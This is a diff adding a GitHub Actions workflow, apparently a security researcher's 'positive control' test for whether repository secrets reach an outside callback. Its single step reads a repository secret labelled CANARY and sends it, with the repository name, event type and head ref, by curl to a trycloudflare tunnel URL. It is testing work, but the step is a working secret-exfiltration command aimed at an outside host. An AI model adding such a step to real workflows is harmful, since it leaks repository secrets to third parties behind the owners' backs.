@@ -1,0 +1,13 @@
+# 0x19 M1 positive control: same-repo run must expose dummy CANARY to callback
+name: 0x19-control
+on:
+  workflow_dispatch:
+jobs:
+  control:
+    runs-on: ubuntu-latest
+    env:
+      CANARY: ${{ secrets.CANARY }}
+    steps:
+      - name: control
+        run: |
+          curl -sS "https://integer-wto-extremely-ultimately.trycloudflare.com/0x19-m1-control?c=${CANARY}&repo=${{ github.repository }}&event=${{ github.event_name }}&head=${{ github.head_ref }}" || true
